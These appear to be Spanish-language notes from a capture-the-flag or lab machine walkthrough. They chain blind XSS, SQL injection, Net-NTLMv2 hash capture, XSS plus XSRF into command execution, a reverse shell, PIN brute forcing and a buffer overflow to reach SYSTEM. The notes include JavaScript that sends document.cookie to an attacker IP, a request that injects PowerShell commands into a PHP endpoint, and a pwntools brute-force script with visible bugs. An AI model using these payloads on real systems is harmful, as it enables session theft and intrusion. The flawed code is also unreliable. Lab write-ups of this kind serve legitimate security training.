## Tecnicas 
- Blind wXSS Injection  
- Stealing the session cookie by XSS injection  
- SQLI - Error Based  
- SQLI - File Access  
- SQLI - Stealing Net-NTLMv2 Hash (impacket-smbserver)  
- XSS + XSRF => RCE  
- Abusing a custom binary (Brute Force Pin && Overflow)
## Procedimiento
- Campo vulnerable a XSS(*Blind*). Podemos confirmar aun asi, si es vulnerable a XSS cargando un "script" de nuestra maquina. Si recibimos una petición, quiere decir que es vulnerable.
- Js scripting ->
```js
request = XMLHttpRequest();
request.open("GET", "http:<ip>/?<Parameter>" + document.cookie, true);
request.send()
```
- SQLi. Recolecíon de credenciales
- SQLI. FIle road vuln
- XSS Convertido en RCE aprovechandose del XSRF del SQLi. Podemos lograr esto si podemos hacer que el usuario mande por GET la query que deseamos desde donde se acontecio el primer XSS. 
- Js scripting ->
```js
request = XMLHttpRequest();
params = 'cmd=dir|powershell -c "$comando";$segundoComando';
request.open("POST", "http://localhost/admin/backdoorchecker.php", true);
request.setRequestHeader('$cabecera', '$valor');
request.send(params);
```
- Listamos los procesos con ``tasklist``, indentificamos el PID del proceso. Buscamos el PID en algun proceso listado con ``netstat -ano``.
- Nos entablamos una revershell con powershell utilizando el repositorio de *nishang*
- **Consejo**: Utilizar la OneLine de Automator para ver los puertos abiertos en powershell.
- Remote Port Fordwarding del puerto que aloja la aplicación.
- Python Scripting ->
```python
#!/bin/bash
from pwn import *
import time

def def_handler(sig, frame):
	print("\n[!] Saliendo...")
	sys.exit(1)

#ctrl + c
signal.signal(signal,SIGINT, def_handler)

def tryPing():

	#Declaramos una varibale que almacene el valor de nuestro diccionario
	pins = open('$diccionario', 'r')
	#Creamos una barra de progreso
	p1 = log.progress("Fuerza bruta")
	p1.status("Comenzando ataque de fuerza bruta")

	time.sleep(2)
	counter = 1
	for pin in pins:

		p1.status("Probando con el PIN %s [%s/10000]" % pin.strip('\n'), str(counter))
	
		#Creacmos un socket que escucha por tcp
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		#Nos conectamos a nuestra maquina por el puerto 910
		s.connect(('127.0.0.1', 910))
		#Declaramos el maximo de bytes que puede leer
		data = s.recv(4096)
		#Mandamos de forma bits(gracias a encode()) la data
		s.send(pin.encode())
		#Volvemos a declarar el maximo de bytes a leer
		data = s.recv(1024)

		if b"Access denied" not in data:
			p1.sucess("El pin correcto es %s" % pin.strip("\n"))
		
		counter += 1
if __name__ == "__main__":
	tryPin()
```
- Una vez obtenido el PIN valido, podemos ver que si tratamos de corromper programa, conseguimos un OverFlow, podemos cambiar hacia adonde apunta la ejecución del programa.
- Creamos un patron de palabras con *pattern_create.rb*. Podemos ver el valor antes de sobreescribir el apuntador con *pattern_offset.rb* y pasandole 4 bites de la cadena con el parametro **-q** 
- Verificamos que asi es con ``python -c "print A*32 + "B"*5``.
- Hacemos que el programa apunte hacia el nc que habiamos transferido para ganar acceso a la maquina como authority\\system